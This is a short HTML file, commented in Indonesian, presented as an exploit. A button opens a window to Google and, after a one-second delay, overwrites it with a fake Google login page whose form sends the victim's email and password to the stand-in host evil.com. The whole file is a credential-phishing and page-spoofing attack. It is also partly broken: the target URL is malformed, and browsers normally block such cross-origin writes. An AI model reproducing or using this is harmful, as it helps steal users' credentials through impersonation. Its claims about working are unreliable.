<!DOCTYPE html>
<html>
  <body>
    <button onclick="exploit()">Jalankan Exploit</button>
    <script>
      function exploit() {
        const w = window.open("https.://google.com", "_blank");

        setTimeout(() => {
          try {
            w.stop(); // menghentikan loading google.com
            w.document.open();
            w.document.write(`
              <html>
                <head><title>Google</title></head>
                <body>
                  <h2>Login ke Google</h2>
                  <form action="https://evil.com" method="POST">
                    <input name="email"><br>
                    <input name="password" type="password"><br>
                    <input type="submit" value="Masuk">
                  </form>
                </body>
              </html>
            `);
            w.document.close();
          } catch (e) {
            console.error("Gagal:", e);
          }
        }, 1000); // delay 1 detik (tune sesuai browser)
      }
    </script>
  </body>
</html>
